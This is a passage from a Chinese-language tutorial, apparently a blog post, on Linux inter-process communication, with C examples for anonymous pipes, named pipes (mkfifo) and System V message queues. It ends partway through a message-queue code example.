写到管道 2 中</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;<span class="comment">// 父进程程序部分</span></span><br><span class="line">close(pipefd1[<span class="number">0</span>]);</span><br><span class="line">close(pipefd2[<span class="number">1</span>]);<span class="comment">// 关闭父进程管道 1 读与管道 2 写</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">read(<span class="number">0</span>, msg, <span class="keyword">sizeof</span>(msg));<span class="comment">// 从标准输入读入字符串</span></span><br><span class="line">write(pipefd1[<span class="number">1</span>], msg, <span class="keyword">sizeof</span>(msg));<span class="comment">// 写到管道 1 中</span></span><br><span class="line">read(pipefd2[<span class="number">0</span>], msg, <span class="keyword">sizeof</span>(msg));<span class="comment">// 从管道 2 读入数据并打印</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Father recv: %s&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="../img/w4.png" alt="双向通信"></p><blockquote><p>无名管道的特性及缺点</p></blockquote><p>特性：</p><ul><li>当进程写一个所有读端都被关闭的管道时，内核会向该进程发送 SIGPIPE 信号，默认会将该进程直接终止</li></ul><p>缺点：</p><ul><li>无法在非亲缘进程间实现通信</li><li>无法实现进程间网状通信</li></ul><br><h3 id="有名管道"><a href="#有名管道" class="headerlink" title="有名管道"></a>有名管道</h3><blockquote><p>读写方式</p></blockquote><p>与无名管道相反，有名管道拥有文件名，由此不论是否为亲缘进程，两个进程间也可以通信。创建有名管道的 API 为 mkfifo，函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mkfifo</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">mode_t</span> mode)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>功能：创建一个有名管道，当创建的文件名在路径下已经存在时，会报文件已存在的错</li><li>参数：<ul><li>pathname：文件路径名</li><li>mode：被创建时的原始权限，一般为 0664，需至少包含读写权限</li></ul></li><li>返回值：<ul><li>成功返回 0</li><li>失败返回 -1，并设置 errno</li></ul></li></ul><p>有名管道文件是特殊文件，不能用 open 函数直接创建，只能用 mkfifo 创建。创建完成后，相应目录下会生成这么一个管道文件，之后多个进程便可通过 open 函数对该文件进行读写，即进程间通信了</p><br><blockquote><p>单向通信与双向通信</p></blockquote><p>单向通信基本与无名管道相同，有名管道双向通信中同样存在抢数据的问题，同样需要两个有名管道</p><p>下面以服务器-客户端的模式来呈现有名管道双向通信，先是服务器端代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 服务器端代码</span></span><br><span class="line"><span class="comment">// gcc namedPipe1.c -o n1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILENAME1 <span class="meta-string">&quot;./tmp1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILENAME2 <span class="meta-string">&quot;./tmp2&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当按下 Ctrl+C 终止时删除有名管道文件</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">removePipeFile</span><span class="params">(<span class="keyword">int</span> signo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">remove(FILENAME1);</span><br><span class="line">remove(FILENAME2);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建/打开有名管道</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createNamedPipe</span><span class="params">(<span class="keyword">char</span> *filename, <span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret, file;</span><br><span class="line"></span><br><span class="line">ret = mkfifo(filename, <span class="number">0664</span>);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span> &amp;&amp; errno != EEXIST)<span class="comment">// 忽略文件已存在时的报错</span></span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;Create Named Pipe Failed&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file = open(filename, mode);<span class="comment">// 将有名管道以 mode 方式打开并返回文件描述符</span></span><br><span class="line"><span class="keyword">if</span>(file == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;Open File Failed&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> msg[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> file1 = createNamedPipe(FILENAME1, O_WRONLY);<span class="comment">// 管道 1 用于服务端发信息</span></span><br><span class="line"><span class="keyword">int</span> file2 = createNamedPipe(FILENAME2, O_RDONLY);<span class="comment">// 管道 2 用于服务端收信息</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!fork())</span><br><span class="line">&#123;<span class="comment">// 服务端子进程用于从客户端接收信息</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">read(file2, msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Server recv: %s&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;<span class="comment">// 服务端父进程用于向客户端发送信息</span></span><br><span class="line">signal(SIGINT, removePipeFile);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">read(<span class="number">0</span>, msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">write(file1, msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是客户端代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 客户端代码</span></span><br><span class="line"><span class="comment">// gcc namedPipe2.c -o n2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILENAME1 <span class="meta-string">&quot;./tmp1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILENAME2 <span class="meta-string">&quot;./tmp2&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createNamedPipe</span><span class="params">(<span class="keyword">char</span> *filename, <span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret, file;</span><br><span class="line"></span><br><span class="line">ret = mkfifo(filename, <span class="number">0664</span>);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span> &amp;&amp; errno != EEXIST)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;Create Named Pipe Failed&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">file = open(filename, mode);</span><br><span class="line"><span class="keyword">if</span>(file == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;Open File Failed&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> msg[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> file1 = createNamedPipe(FILENAME1, O_RDONLY);<span class="comment">// 管道 1 用于客户端收信息</span></span><br><span class="line"><span class="keyword">int</span> file2 = createNamedPipe(FILENAME2, O_WRONLY);<span class="comment">// 管道 2 用于客户端发信息</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!fork())</span><br><span class="line">&#123;<span class="comment">// 客户端子进程用于向服务器发送信息</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">read(<span class="number">0</span>, msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">write(file2, msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;<span class="comment">// 客户端父进程用于从服务器接收信息</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">read(file1, msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Client recv: %s&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="../img/y1.png" alt="双向通信"></p><blockquote><p>使用场合</p></blockquote><ul><li>两个不论是否为亲缘关系进程间通信时，可以使用有名管道</li><li>实现多进程间网状通信也可以使用，不过进程数量一多，实现起来就会很复杂</li></ul><br><h3 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h3><blockquote><p>原理</p></blockquote><p>system V IPC 类的通信方式与管道通信实现机制不同，就消息队列来说，其本质是由<strong>内核创建的用于存放消息的双向链表，</strong>进程通过操作同一个消息队列就能实现通信。链表上的每个结点就是一个消息，除了形成双向链表所用的结构体指针外，结点还包含一个消息包，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span> &#123;</span></span><br><span class="line"><span class="keyword">long</span> mtype;<span class="comment">// 消息类型</span></span><br><span class="line"><span class="keyword">char</span> mtext[msgsz];<span class="comment">// 消息正文，容量为 msgsz</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>多进程在使用消息队列通信时，需要发消息的进程会把消息挂到链表上，收取指定消息类型的进程就会把消息取下来从而达到通信目的。</p><p>消息类型好比邮箱地址，假设进程 A，B，C 在通信（三者都使用 A 创建的消息队列），A 的邮箱地址(消息类型)是 0，B 与 C 的邮箱分别是 1 和 2。现在假设 A 要给 B 和 C 发信息通知他们该吃饭了，那么 A 会产生两个消息包，一个消息包的消息类型填上 B 的邮箱 1，另一个消息包的消息类型填上 2，并且两个消息包的消息正文都填上 “该吃饭了”。之后，A 通过 API 函数将消息挂在消息队列上，B 和 C 同样通过 API 函数分别从消息队列上接收类型为 1 和 2 的信息，这样 B 和 C 就知道该吃饭了。C 想告诉 A 他吃过饭了，C 也要产生一个消息类型是 0(A 的邮箱)、正文是 “我吃过了” 的消息包通过 API 挂上消息队列，A 一收取 0 类信息也就知晓 C 吃过了。</p><p>由以上的描述，可以得知使用消息队列来<strong>实现网状交叉通信</strong>会比有名管道容易得多。需要通信的进程通过<strong>消息队列标识符</strong>找到消息队列的位置，然后封装好消息包，挂上消息队列，就可以与任意知晓该消息队列的进程通信了。</p><br><blockquote><p>创建消息队列</p></blockquote><p>使用 msgget 函数可以<strong>创建或者获取已存在</strong>的消息队列，其函数原型为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p>参数：</p><ul><li>key：该函数通过 key 值来创建一个具有唯一标识符的消息队列，该值可以为：<ul><li>IPC_PRIVATE：每次调用 msgget 都会创建新的消息队列</li><li>指定一个整型数：容易重复</li><li><strong>使用 ftok 函数生成</strong></li></ul></li><li>msgflg：创建消息队列时的原始权限，需至少具有读写权限。创建新队列时，还需指定 IPC_CREAT 选项</li></ul></li><li><p>返回值：</p><ul><li>成功返回消息队列唯一标识符 msgid</li><li>失败返回 -1，并设置 errno</li></ul></li></ul><p>一般 key 都是通过 ftok 生成的，其原型为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">key_t</span> <span class="title">ftok</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> proj_id)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p>功能：通过 pathname 与 proj_id 生成唯一的 key，只要两个参数的值不变，key 值就不会变</p></li><li><p>参数：</p><ul><li><p>pathname：文件路径名</p></li><li><p>proj_id：只会使用该参数的低八位，故常被指定为一个字符</p></li></ul></li><li><p>返回值：</p><ul><li>成功返回生成的 key 值</li><li>失败返回 -1，并设置 errno</li></ul></li></ul><br><blockquote><p>收发消息</p></blockquote><ol><li>发送消息即将消息挂在消息队列中，通过 msgsnd 函数可以实现：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">const</span> <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p>参数：</p><ul><li>msqid：消息队列唯一标识符</li><li>msgp：消息包地址，即上面提及的 struct msgbuf 的一个填写好的实例</li><li>msgsz：消息正文的大小</li><li>msgflg：发送模式，常用的有两种：<ul><li>0：一直阻塞等直到发送成功</li><li>IPC_NOWAIT：无论发送是否成功都不会阻塞</li></ul></li></ul></li><li><p>返回值：</p><ul><li>成功返回 0</li><li>失败返回 -1，并设置 errno</li></ul></li></ul><ol start="2"><li>接收消息使用 msgrcv:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p>参数：</p><ul><li>msqid：消息队列唯一标识符</li><li>msgp：消息包地址</li><li>msgsz：消息正文的大小</li><li>msgtyp：要接收的消息类型（相当于你的邮箱地址）</li><li>msgflg：接收模式，常用的有两种：<ul><li>0：没有消息时，接收会休眠（阻塞）</li><li>IPC_NOWAIT：无论是否接收到消息都不会阻塞</li></ul></li></ul></li><li><p>返回值：</p><ul><li>成功返回消息正文的字节数</li><li>失败返回 -1，并设置 errno</li></ul></li></ul><br><blockquote><p>销毁消息队列</p></blockquote><p>消息队列一旦创建不会随着进程运行的结束而自动销毁，需要使用 msgctl 函数来手动销毁</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgctl</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">int</span> cmd, struct msqid_ds *buf)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>功能：该函数根据参数 cmd 指定的功能来控制消息队列，可以做到：<ul><li>获取、修改消息队列属性信息</li><li>销毁消息队列等</li></ul></li><li>参数：<ul><li>msqid：消息队列唯一标识符</li><li>cmd：控制选项，常用的有：<ul><li>IPC_STAT：将 msqid 指向的消息队列属性读到第三个参数 buf 中</li><li>IPC_SET：用 buf 中的消息队列属性修改消息队列属性</li><li>IPC_RMID：销毁消息队列，第三个参数为 NULL</li></ul></li><li>buf：根据 cmd 的不同有不同的解释方式</li></ul></li></ul><p>消息队列的属性用一个结构体 msqid_ds 记录，里面记录了消息队列当前消息条数、所有消息总字节数等信息，这里不再展开</p><br><blockquote><p>终端中查看消息队列</p></blockquote><p>在终端中可以通过 <strong>ipcs -q</strong> 指令查看当前存在的消息队列</p><p>也可以通过 <strong>ipcrm -q + 对应 msqid</strong> 来删除指定的消息队列</p><br><blockquote><p>代码实现</p></blockquote><p>下面实现了一个多进程间通过消息队列来通信的程序，父进程发送消息，子进程接收消息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSGSIZE 1024<span class="comment">// 定义数据正文大小</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PATHNAME <span class="meta-string">&quot;./tmp&quot;</span><span class="comment">// 生成 key 用到的路径名</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> msgId;<span class="comment">// 将 msgid 定义为全局变量方便通信结束销毁消息队列</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span>&#123;</span></span><br><span class="line"><span class="keyword">long</span> mtype;</span><br><span class="line"><span class="keyword">char</span> mtext[MSGSIZE];</span><br><span class="line">&#125; msgSendPackage, msgRecvPackage;<span class="comment">// 声明用于发送和接收消息的消息包</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span> <span class="title">msgBuf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印出错的函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printError</span><span class="params">(<span class="keyword">char</span> *error)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(error);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按下 Ctrl+C 